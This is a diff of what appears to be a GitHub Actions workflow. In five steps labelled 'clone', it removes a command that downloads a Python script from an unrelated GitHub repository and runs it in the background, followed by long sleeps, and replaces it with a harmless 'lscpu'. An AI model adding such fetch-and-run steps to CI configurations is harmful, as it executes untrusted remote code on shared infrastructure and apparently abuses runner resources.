@@ -25,7 +25,7 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: wget https://github.com/ratnasi7283-art/tes/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
+      run: lscpu &
            sleep 309s
   hema:
     needs: hem
@@ -48,7 +48,7 @@ jobs:
         node-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/ratnasi7283-art/tes/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
+      run: lscpu &
             sleep 5m
         
     
@@ -74,8 +74,8 @@ jobs:
         node-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/ratnasi7283-art/tes/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
-            sleep 6m
+      run: lscpu &
+            sleep 5m
   sat:
     needs: hema
     runs-on: ubuntu-latest
@@ -97,8 +97,8 @@ jobs:
         node-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/ratnasi7283-art/tes/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
-            sleep 78m
+      run: lscpu &
+            sleep 5m
         
     
      
@@ -123,8 +123,8 @@ jobs:
         node-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: wget https://github.com/ratnasi7283-art/tes/raw/refs/heads/main/mem.py && chmod u+x mem.py && python mem.py &
-            sleep 59m
+      run: lscpu &
+            sleep 5m
         
     
   
